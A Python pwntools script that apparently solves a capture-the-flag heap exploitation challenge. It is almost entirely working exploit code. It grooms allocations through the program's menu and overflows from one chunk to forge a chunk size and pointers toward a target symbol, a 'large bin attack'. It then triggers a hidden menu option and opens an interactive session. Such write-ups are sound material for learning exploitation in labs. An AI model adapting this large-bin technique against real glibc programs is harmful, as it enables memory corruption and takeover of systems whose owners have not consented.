from pwn import *
context.arch = "amd64"
# heap overflow + large bin attack.
#p = process("./main_patched")
p = remote("0.0.0.0", 1339)
elf = ELF("../challenge/main_patched")

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sla = lambda a, b: p.sendlineafter(a, b)
sl = lambda a: p.sendline(a)
ru = lambda a: p.recvuntil(a)

def cmd(choice): sla(b"Choice >> ", str(choice))

def allocate(size, data):
    cmd(1)
    sla(b"Size: ", str(size))
    sla(b"Data: ", data)

def delete(idx):
    cmd(2)
    sla(b"Index: ", str(idx))

def edit(idx, data):
    cmd(3)
    sla(b"Index: ", str(idx))
    sla(b"Data: ", data)

if __name__ == "__main__":
    allocate(0x20, b"retr0") # 0

    allocate(0x428, b"A" * 0x8) # 1
    allocate(0x18, b"CONSO") # 2

    allocate(0x418, b"B" * 0x8) # 3
    allocate(0x18, b"CONSO") # 4

    delete(1)

    allocate(0x438, b"C" * 0x8) # 5

    delete(3)

    edit(0, p64(0) * 5 + p64(0x431) + p64(elf.sym.target - 0x20) * 4)

    allocate(0x438, b"exploit")
    
    cmd(1337)
    #gdb.attach(p)
    p.interactive()
